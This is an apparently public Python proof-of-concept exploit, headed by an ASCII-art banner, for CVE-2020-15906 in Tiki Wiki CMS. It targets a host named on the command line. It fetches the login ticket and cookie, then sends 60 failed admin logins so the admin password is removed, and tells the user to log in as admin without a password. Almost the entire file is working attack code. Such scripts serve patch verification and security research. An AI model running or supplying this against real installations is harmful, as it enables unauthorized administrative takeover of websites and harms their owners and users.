#!/usr/bin/env/python3
import requests
import json
import lxml.html
import sys

banner = ''' 

████████ ██ ██   ██ ██ ██     ██ ██ ██   ██ ██     ██████   ██    ██                                                                                                    
   ██    ██ ██  ██  ██ ██     ██ ██ ██  ██  ██          ██ ███   ███                                                                                                    
   ██    ██ █████   ██ ██  █  ██ ██ █████   ██      █████   ██    ██                                                                                                    
   ██    ██ ██  ██  ██ ██ ███ ██ ██ ██  ██  ██     ██       ██    ██                                                                                                    
   ██    ██ ██   ██ ██  ███ ███  ██ ██   ██ ██     ███████  ██ ██ ██                                                                                                    
                                                                                                                                                                        
                                                                                                                                                                        
 █████  ██    ██ ████████ ██   ██ ███████ ███    ██ ████████ ██  ██████  █████  ████████ ██  ██████  ███    ██         ██████  ██    ██ ██████   █████  ███████ ███████ 
██   ██ ██    ██    ██    ██   ██ ██      ████   ██    ██    ██ ██      ██   ██    ██    ██ ██    ██ ████   ██         ██   ██  ██  ██  ██   ██ ██   ██ ██      ██      
███████ ██    ██    ██    ███████ █████   ██ ██  ██    ██    ██ ██      ███████    ██    ██ ██    ██ ██ ██  ██         ██████    ████   ██████  ███████ ███████ ███████ 
██   ██ ██    ██    ██    ██   ██ ██      ██  ██ ██    ██    ██ ██      ██   ██    ██    ██ ██    ██ ██  ██ ██         ██   ██    ██    ██      ██   ██      ██      ██ 
██   ██  ██████     ██    ██   ██ ███████ ██   ████    ██    ██  ██████ ██   ██    ██    ██  ██████  ██   ████         ██████     ██    ██      ██   ██ ███████ ███████ 
                                                                                                                                                                        
Poof of Concept for CVE-2020-15906 by Maximilian Barz, Twitter: S1lky_1337
'''




def main():
    if(len(sys.argv) < 2):
        print(banner)
        print("Usage: %s <host> " % sys.argv[0])
        print("Eg:    %s 1.2.3.4 " % sys.argv[0])
        return


    rhost = sys.argv[1]
    url = "http://"+rhost+"/tiki/tiki-login.php"

    session = requests.Session()

    def get_ticket():
        r = requests.get(url)
        login_page = r.text.encode('utf-8') 
        html = lxml.html.fromstring(login_page) 
        auth = html.xpath('//input[@name="ticket"]/@value')

        return str(auth)[2:-2]

    def get_cookie():
        session.get(url)
        return session.cookies.get_dict()


    cookie = get_cookie()
    ticket = get_ticket()
    
    payload = {'ticket': ticket,'user':'admin', 'pass':'test','login':'','stay_in_ssl_mode_present':'y','stay_in_ssl_mode':'n'}
    headers = {
        'Host': rhost,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzrhost, deflate',
        'Referer': 'http://'+rhost+'/tiki/tiki-login.php',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '125',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
    }


    for i in range(60):
        r = session.post(url, payload, headers)
        if("Account requires administrator approval." in r.text):
            print("Admin Password got removed.")
            print("Use BurpSuite to login into admin without a password ")



if(__name__ == '__main__'):
    main()